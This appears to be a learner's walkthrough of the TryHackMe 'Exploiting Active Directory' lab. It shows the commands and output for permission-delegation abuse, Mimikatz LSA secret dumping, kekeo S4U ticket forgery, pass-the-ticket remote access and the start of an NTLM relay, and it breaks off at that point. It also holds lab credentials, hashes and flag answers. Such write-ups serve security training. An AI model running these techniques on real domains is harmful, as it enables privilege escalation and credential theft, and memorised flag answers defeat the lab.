# Exploiting Active Directory 

## Task 1  Introduction
+ Setup The VPN (Network)
# Generated by NetworkManager
search 1.1.1.1
nameserver 10.200.129.101

+ Get Credential from `http://distributor.za.tryhackme.loc/creds`
colin.lane:Arrangement2012

+ SSH to user `ssh colin.lane@za.tryhackme.loc@thmwrk1.za.tryhackme.loc`

## Task 2  Exploiting Permission Delegation
+ Which ACE would allow you to update any non-protected parameter of a target object?`GenericWrite`
+ What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)? `THM{Permission.Delegation.FTW!}`
```bash
PS C:\Users\colin.lane> Add-ADGroupMember "IT Support" -Members "colin.lane"
PS C:\Users\colin.lane> Get-ADGroupMember -Identity "IT Support"


distinguishedName : CN=brenda.black,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : brenda.black
objectClass       : user
objectGUID        : fbeba2af-fb5a-45ae-b15b-23f4a439f6e9
SamAccountName    : brenda.black
SID               : S-1-5-21-3885271727-2693558621-2658995185-1115

distinguishedName : CN=reece.noble,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : reece.noble
objectClass       : user
objectGUID        : d14e6d49-1454-4f97-ae79-f27809a54403
SamAccountName    : reece.noble
SID               : S-1-5-21-3885271727-2693558621-2658995185-1117

distinguishedName : CN=paula.bailey,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc
name              : paula.bailey
objectClass       : user
objectGUID        : bb8b8415-82ea-42ea-93ea-aa8afaf5f9ab
SamAccountName    : paula.bailey
SID               : S-1-5-21-3885271727-2693558621-2658995185-1126

distinguishedName : CN=sarah.hilton,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc
name              : sarah.hilton
objectClass       : user
objectGUID        : 1c3ae564-b2ea-424b-bf34-47247ce3763b
SamAccountName    : sarah.hilton
SID               : S-1-5-21-3885271727-2693558621-2658995185-1128

distinguishedName : CN=lorraine.gill,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc
name              : lorraine.gill
objectClass       : user
objectGUID        : 073ee68f-a6a0-43a8-b7ce-5afb407977d7
SamAccountName    : lorraine.gill
SID               : S-1-5-21-3885271727-2693558621-2658995185-1129

distinguishedName : CN=christine.hall,OU=Human Resources,OU=People,DC=za,DC=tryhackme,DC=loc
name              : christine.hall
objectClass       : user
objectGUID        : 4f202ec6-2235-44c4-9095-f20ceb4d98c6
SamAccountName    : christine.hall
SID               : S-1-5-21-3885271727-2693558621-2658995185-1130

distinguishedName : CN=phillip.wilkins,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : phillip.wilkins
objectClass       : user
objectGUID        : f738c055-21b4-4129-a08c-89f29b8170fe
SamAccountName    : phillip.wilkins
SID               : S-1-5-21-3885271727-2693558621-2658995185-1131

distinguishedName : CN=colin.lane,OU=Human Resources,OU=People,DC=za,DC=tryhackme,DC=loc
name              : colin.lane
objectClass       : user
objectGUID        : cb777a93-fadd-464f-b588-4c69f4bb0444
SamAccountName    : colin.lane
SID               : S-1-5-21-3885271727-2693558621-2658995185-1132

distinguishedName : CN=irene.leach,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc
name              : irene.leach
objectClass       : user
objectGUID        : c819acd1-7e21-4ded-ba8c-1e39f3a06523
SamAccountName    : irene.leach
SID               : S-1-5-21-3885271727-2693558621-2658995185-1134
```
+ Checking TIER 2 ADMIN
```bash
PS C:\Users\colin.lane> Get-ADGroupMember -Identity "Tier 2 Admins"


distinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_lawrence.lewis
objectClass       : user
objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828
SamAccountName    : t2_lawrence.lewis
SID               : S-1-5-21-3885271727-2693558621-2658995185-1893

distinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_leon.francis
objectClass       : user
objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9
SamAccountName    : t2_leon.francis
SID               : S-1-5-21-3885271727-2693558621-2658995185-3660

distinguishedName : CN=t2_henry.harvey,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

distinguishedName : CN=t2_june.russell,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_june.russell
objectClass       : user
objectGUID        : e9b91021-2cb4-4a81-bf09-13a24393ffb7
SamAccountName    : t2_june.russell
SID               : S-1-5-21-3885271727-2693558621-2658995185-4407

distinguishedName : CN=t2_kathleen.mills,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_kathleen.mills
objectClass       : user
objectGUID        : 3be7353e-7c5c-4f46-9790-aef3bbe826a1
SamAccountName    : t2_kathleen.mills
SID               : S-1-5-21-3885271727-2693558621-2658995185-4493

distinguishedName : CN=t2_irene.nash,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_irene.nash
objectClass       : user
objectGUID        : 59429b63-1330-4646-8155-e7d95da0aa68
SamAccountName    : t2_irene.nash
SID               : S-1-5-21-3885271727-2693558621-2658995185-4654

distinguishedName : CN=t2_henry.shaw,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_henry.shaw
objectClass       : user
objectGUID        : 4045398b-de3e-463b-a8e7-085e5f09f478
SamAccountName    : t2_henry.shaw
SID               : S-1-5-21-3885271727-2693558621-2658995185-5230

distinguishedName : CN=t2_alan.riley,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_alan.riley
objectClass       : user
objectGUID        : d8398c06-1f07-403c-a4b5-0882b1233e1e
SamAccountName    : t2_alan.riley
SID               : S-1-5-21-3885271727-2693558621-2658995185-5243

distinguishedName : CN=t2_jordan.hawkins,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_jordan.hawkins
objectClass       : user
objectGUID        : c43fea27-5821-4a28-8e4b-98ecdb04d649
SamAccountName    : t2_jordan.hawkins
SID               : S-1-5-21-3885271727-2693558621-2658995185-5245

distinguishedName : CN=t2_ross.bird,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_ross.bird
objectClass       : user
objectGUID        : d7cb6223-38f0-4553-9ef3-d10727bdcc02
SamAccountName    : t2_ross.bird
SID               : S-1-5-21-3885271727-2693558621-2658995185-5316

distinguishedName : CN=t2_robin.wyatt,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_robin.wyatt
objectClass       : user
objectGUID        : 88b92158-56a1-43cb-b21c-1514098524c2
SamAccountName    : t2_robin.wyatt
SID               : S-1-5-21-3885271727-2693558621-2658995185-5409

distinguishedName : CN=t2_caroline.dawson,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_caroline.dawson
objectClass       : user
objectGUID        : 38060b6d-9e78-40bc-95d5-e7d7a61abf6e
SamAccountName    : t2_caroline.dawson
SID               : S-1-5-21-3885271727-2693558621-2658995185-5437

distinguishedName : CN=t2_melanie.davies,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_melanie.davies
objectClass       : user
objectGUID        : c9625ed3-0391-40ba-9c6d-b4046049c434
SamAccountName    : t2_melanie.davies
SID               : S-1-5-21-3885271727-2693558621-2658995185-5929
```
+ Creating User from TIER 2 ADMINS member
```bash
PS C:\Users\colin.lane> $Password = ConvertTo-SecureString "Dodol123" -AsPlainText -Force
PS C:\Users\colin.lane> Set-ADAccountPassword -Identity "t2_henry.shaw" -Reset -NewPassword $Password
```

+ Getting FLag1.txt
```bash
C:\Users\t2_henry.shaw>cd ..

C:\Users>cd Administrator

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\Administrator\Desktop

01/20/2024  07:11 PM    <DIR>          .
01/20/2024  07:11 PM    <DIR>          ..
01/20/2024  07:12 PM         4,862,976 agent.exe
04/30/2022  10:53 AM                31 flag1.txt
               2 File(s)      4,863,007 bytes
               2 Dir(s)  50,320,805,888 bytes free

C:\Users\Administrator\Desktop>type flag1.txt
THM{Permission.Delegation.FTW!}
```

## Task 3  Exploiting Kerberos Delegation
+ Which Kerberos Delegation type allows for delegation of all services?`Unconstrained Delegation`
+ Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?`Resource-Based Constrained Delegation`
+ Which Constrained Delegation service allows access to the file system of the system via delegation?`CIFS`
+ What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?`THM{Constrained.Delegation.Can.Be.Very.Bad}`


```bash
PS C:\Users\t2_henry.shaw> Import-Module C:\Tools\PowerView.ps1
PS C:\Users\t2_henry.shaw> Get-NetUser -TrustedToAuth


logoncount               : 48
badpasswordtime          : 1/1/1601 12:00:00 AM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 1/20/2024 6:18:51 PM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 1/20/2024 6:18:51 PM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc,
                           http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 1/22/2024 7:44:21 PM
badpwdcount              : 0
cn                       : IIS Server
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 155705
```

+ Running Mimikatz to LSADump 
```bash
C:\>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::secrets
Domain : THMWRK1
SysKey : a1403e57976b472bce5f231922ca3942

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 )
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463

Secret  : $MACHINE.ACC
cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0
    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0
old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31
    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431
    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431

Secret  : NL$KM
cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58
old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: Password1@
```

+ Generate The Kerberos Ticket 
```bash
PS C:\> C:\Tools\kekeo\x64\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
Realm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.129.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

+ Check user on Powershell for `Tier 1 Admins`  to use to kekeo
```bash
PS C:\Users\colin.lane> Get-ADGroupMember -Identity "Tier 1 Admins"


distinguishedName : CN=t1_jake.scott,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t1_jake.scott
objectClass       : user
objectGUID        : e43575b1-2d42-43b9-aed3-0301101f3731
SamAccountName    : t1_jake.scott
SID               : S-1-5-21-3885271727-2693558621-2658995185-1355

distinguishedName : CN=t1_vincent.watson,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_vincent.watson
objectClass       : user
objectGUID        : 10d1a007-39a5-4f4c-81c4-35f5f67ee893
SamAccountName    : t1_vincent.watson
SID               : S-1-5-21-3885271727-2693558621-2658995185-1363

distinguishedName : CN=t1_pamela.dunn,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_pamela.dunn
objectClass       : user
objectGUID        : fb282283-929b-4f69-a5ad-3bcb060135b3
SamAccountName    : t1_pamela.dunn
SID               : S-1-5-21-3885271727-2693558621-2658995185-1478

distinguishedName : CN=t1_julie.thompson,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_julie.thompson
objectClass       : user
objectGUID        : 575dce4e-618a-4084-a876-8c44a4c9b8d2
SamAccountName    : t1_julie.thompson
SID               : S-1-5-21-3885271727-2693558621-2658995185-2195

distinguishedName : CN=t1_arthur.begum,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_arthur.begum
objectClass       : user
objectGUID        : 6b58e07a-b5c3-4219-b68f-d7586812426f
SamAccountName    : t1_arthur.begum
SID               : S-1-5-21-3885271727-2693558621-2658995185-2283

distinguishedName : CN=t1_mohammed.jones,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_mohammed.jones
objectClass       : user
objectGUID        : bda20c7b-2578-4352-98a0-39ddb3f50377
SamAccountName    : t1_mohammed.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-2399

distinguishedName : CN=t1_daniel.lawrence,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_daniel.lawrence
objectClass       : user
objectGUID        : f232a3eb-3601-4b5c-8f49-ad3656a69ac6
SamAccountName    : t1_daniel.lawrence
SID               : S-1-5-21-3885271727-2693558621-2658995185-2625

distinguishedName : CN=t1_jay.bennett,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_jay.bennett
objectClass       : user
objectGUID        : 23ceb6e3-a48d-4b10-bd08-5d628e9cad23
SamAccountName    : t1_jay.bennett
SID               : S-1-5-21-3885271727-2693558621-2658995185-2726

distinguishedName : CN=t1_trevor.jones,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_trevor.jones
objectClass       : user
objectGUID        : 55075f84-b1a9-4f92-87eb-431928140a25
SamAccountName    : t1_trevor.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-3273

distinguishedName : CN=t1_bernard.freeman,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_bernard.freeman
objectClass       : user
objectGUID        : e2d2d4e2-280c-4b06-a4fb-fcf94d9537dd
SamAccountName    : t1_bernard.freeman
SID               : S-1-5-21-3885271727-2693558621-2658995185-3383

distinguishedName : CN=t1_joseph.barlow,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_joseph.barlow
objectClass       : user
objectGUID        : 0bbff7f1-91d5-4106-aaed-8e50d7a3d6c2
SamAccountName    : t1_joseph.barlow
SID               : S-1-5-21-3885271727-2693558621-2658995185-3499

distinguishedName : CN=t1_jayne.cox,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t1_jayne.cox
objectClass       : user
objectGUID        : cf031bee-9bd7-4387-a256-17eca610af31
SamAccountName    : t1_jayne.cox
SID               : S-1-5-21-3885271727-2693558621-2658995185-3557

distinguishedName : CN=t1_angela.richardson,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_angela.richardson
objectClass       : user
objectGUID        : 2be0f43f-814a-4f3f-930e-7e65873fe3b1
SamAccountName    : t1_angela.richardson
SID               : S-1-5-21-3885271727-2693558621-2658995185-3754

distinguishedName : CN=t1_kathleen.mills,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_kathleen.mills
objectClass       : user
objectGUID        : 02254904-b249-47ef-b187-c9d60043976a
SamAccountName    : t1_kathleen.mills
SID               : S-1-5-21-3885271727-2693558621-2658995185-4494

distinguishedName : CN=t1_lisa.mclean,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_lisa.mclean
objectClass       : user
objectGUID        : 6416d8ba-cbed-485d-8ec6-80bc9defb6bb
SamAccountName    : t1_lisa.mclean
SID               : S-1-5-21-3885271727-2693558621-2658995185-4565

distinguishedName : CN=t1_bruce.powell,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_bruce.powell
objectClass       : user
objectGUID        : 9bd02c03-45f0-461f-a5c7-4ff29bb1c6ce
SamAccountName    : t1_bruce.powell
SID               : S-1-5-21-3885271727-2693558621-2658995185-4869

distinguishedName : CN=t1_jemma.davey,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_jemma.davey
objectClass       : user
objectGUID        : 0d79e3df-6173-43d7-b549-1857db47d52d
SamAccountName    : t1_jemma.davey
SID               : S-1-5-21-3885271727-2693558621-2658995185-5142

distinguishedName : CN=t1_duncan.moran,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_duncan.moran
objectClass       : user
objectGUID        : bac839b6-c3a0-4ea5-b8aa-7a97b7ca65f1
SamAccountName    : t1_duncan.moran
SID               : S-1-5-21-3885271727-2693558621-2658995185-5240

distinguishedName : CN=t1_melanie.wilson,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_melanie.wilson
objectClass       : user
objectGUID        : ea026960-9a0d-4621-b593-b5c3ef07a5e5
SamAccountName    : t1_melanie.wilson
SID               : S-1-5-21-3885271727-2693558621-2658995185-5418

distinguishedName : CN=t1_caroline.dawson,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_caroline.dawson
objectClass       : user
objectGUID        : 80173414-b5a9-414b-aa68-8b63319d2b57
SamAccountName    : t1_caroline.dawson
SID               : S-1-5-21-3885271727-2693558621-2658995185-5438

distinguishedName : CN=t1_eileen.burton,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_eileen.burton
objectClass       : user
objectGUID        : 67334491-01ae-4148-a853-f8c84ae437e8
SamAccountName    : t1_eileen.burton
SID               : S-1-5-21-3885271727-2693558621-2658995185-5530

distinguishedName : CN=t1_jay.wilson,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_jay.wilson
objectClass       : user
objectGUID        : 5ab51edc-8054-4f78-a3a7-ac0742d00f93
SamAccountName    : t1_jay.wilson
SID               : S-1-5-21-3885271727-2693558621-2658995185-5869

distinguishedName : CN=t1_steven.blake,OU=T1 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t1_steven.blake
objectClass       : user
objectGUID        : 8b20d2ff-a61d-424e-9dd0-c6c440a2f431
SamAccountName    : t1_steven.blake
SID               : S-1-5-21-3885271727-2693558621-2658995185-6123

```

+ Forge TGS requests for the account we want to impersonate on `TIER 1 Admins` we use  `t1_lisa.mclean` for HTTP
```bash
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_lisa.mclean /service:http/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [1/22/2024 9:52:34 PM ; 1/23/2024 7:52:34 AM] {R:1/29/2024 9:52:34 PM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 876d22e26d80bf0bd79724e068a6124bc71d87cc71d66e176be5d2962fd6be53
  [s4u2self]  t1_lisa.mclean
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.129.101 (auto)
  > Ticket in file 'TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```
+ Forge TGS requests for the account we want to impersonate on `TIER 1 Admins` we use  `t1_lisa.mclean` for WSMAN
```bash
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_lisa.mclean /service:wsman/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [1/22/2024 9:52:34 PM ; 1/23/2024 7:52:34 AM] {R:1/29/2024 9:52:34 PM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 876d22e26d80bf0bd79724e068a6124bc71d87cc71d66e176be5d2962fd6be53
  [s4u2self]  t1_lisa.mclean
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.129.101 (auto)
  > Ticket in file 'TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] wsman/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

+ Now that we have the two TGS tickets, we can use Mimikatz to import them:
```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
* File: 'TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
* File: 'TGS_t1_lisa.mclean@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK
```

```bash

PS C:\> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_lisa.mclean\Documents> whoami
za\t1_lisa.mclean

[thmserver1.za.tryhackme.loc]: PS C:\Users\Administrator\Desktop> cat flag2.txt
THM{Constrained.Delegation.Can.Be.Very.Bad}
```

## Task 4  Exploiting Automated Relays
+ How often (in days) are the passwords of Windows machine accounts rotated by default?`30`
+ What should not be enforced if we want to relay an SMB authentication attempt?`smb signing`
+ What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?`THM{Printing.Some.Shellz}`

```bash
┌──(kali㉿kali)-[~/TryHackMe/ExploitAD]
└─$ nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 09:46 WIB
Nmap scan report for thmserver1.za.tryhackme.loc (10.200.129.201)
Host is up (0.67s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for thmserver2.za.tryhackme.loc (10.200.129.202)
Host is up (0.42s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 2 IP addresses (2 hosts up) scanned in 18.48 seconds


PS C:\> Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc

Name                 ComputerName         Description          PortMonitor
----                 ------------         -----------          -----------
COM1:                thmserver2.za.try... Local Port           Local Monitor
COM2:                thmserver2.za.try... Local Port           Local Monitor
COM3:                thmserver2.za.try... Local Port           Local Monitor
COM4:                thmserver2.za.try... Local Port           Local Monitor
FILE:                thmserver2.za.try... Local Port           Local Monitor
LPT1:                thmserver2.za.try... Local Port           Local Monitor
LPT2:                thmserver2.za.try... Local Port           Local Monitor
LPT3:                thmserver2.za.try... Local Port           Local Monitor
PORTPROMPT:          thmserver2.za.try... Local Port           Local Monitor

┌──(kali㉿kali)-[~/TryHackMe/ExploitAD]
└─$ impacket-ntlmrelayx -smb2support -t smb://10.200.129.201 -debug
Impacket v0.11.0 - Copyright 2023 Fortra

